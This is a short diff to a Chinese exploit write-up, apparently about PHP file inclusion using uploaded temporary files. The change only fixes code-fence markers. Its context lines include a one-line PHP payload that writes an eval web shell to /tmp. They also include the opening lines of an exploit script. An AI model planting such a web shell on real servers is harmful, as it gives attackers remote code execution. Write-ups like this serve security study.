@@ -77,13 +77,13 @@ data = re.search(r"(?<=tmp_name] =&gt; ).*", r.content).group(0)
 #打印
 #print r.content
 print data
-`
+```
 我们选择包含后写入文件的shell：
 
 `<?php file_put_contents('/tmp/_POST', '<?php @eval($_POST[_GET]);?>');?>`
 
 尝试进行exp编写：
-`
+```
 import os
 import socket
 import sys
